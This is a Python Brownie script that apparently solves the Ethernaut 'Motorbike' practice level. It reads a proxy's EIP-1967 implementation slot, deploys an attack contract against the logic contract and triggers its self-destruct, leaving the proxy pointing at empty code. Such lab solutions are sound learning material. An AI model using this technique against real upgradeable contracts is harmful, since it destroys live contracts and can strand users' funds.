from scripts.helpful_scripts import POINT_ONE, TEN, get_account, ONE
from web3 import Web3
from web3.auto import w3
from brownie import (
    MotorbikeFactory,
    Motorbike,
    MotorbikeAttack,
    Engine,
    SeflDestructContract,
    network,
    Contract,
    config,
)

# INFURA_KEY = config["infura"]["infura_key"]
# w3 = Web3(Web3.HTTPProvider("https://rinkeby.infura.io/v3/" + INFURA_KEY))


def deploy_Motorbike():
    deployer = get_account(index=1)
    factory = MotorbikeFactory.deploy(
        {"from": deployer},
    )
    tx = factory.createInstance(deployer, {"from": deployer})
    proxy = tx.return_value
    return proxy


def deploy_MotorbikeAttack(implementation):
    account = get_account()
    attack = MotorbikeAttack.deploy(implementation, {"from": account})
    return attack


def main():
    print(network.show_active())
    # accounts
    account = get_account()
    deployer = get_account(index=1)  # local testing
    print(f"account address: {account}")
    print(f"deployer address: {deployer}")  # local testing

    # CONTRACTS
    # Proxy (Motorbike)
    proxy = deploy_Motorbike()  # local testing
    # proxy_address = "0x9a639Ed0667B2f6f4DF775018b35a95b89B96E30"
    proxy = Contract.from_abi(Motorbike._name, proxy, Motorbike.abi)

    # Implementation contract (through proxy)
    engine = Contract.from_abi(Engine._name, proxy.address, Engine.abi)

    logic_contract_address_storage_slot = (
        0x360894A13BA1A3210667C828492DB98DCA3E2076CC3735A920A3CA505D382BBC
    )
    implementation_address = w3.eth.get_storage_at(
        proxy.address, logic_contract_address_storage_slot
    ).hex()

    # implementation_address = "0x" + implementation_address[26:]
    # Implementation contract directly
    engine_contract = Contract.from_abi(
        Engine._name, implementation_address, Engine.abi
    )
    # attack contract with selfdestruct function
    attack = deploy_MotorbikeAttack(engine_contract)

    attack.attack({"from": account})
    print(f"proxy address: {proxy.address}")
    print(f"implementation address: {implementation_address}\n")
    # print(
    #     f"upgrader store in proxy: {engine.upgrader()}"
    # )  # fails since no contract there anymore
    print(f"proxy still point to implementation address: {implementation_address}")
    print("But there nothing there anymore")
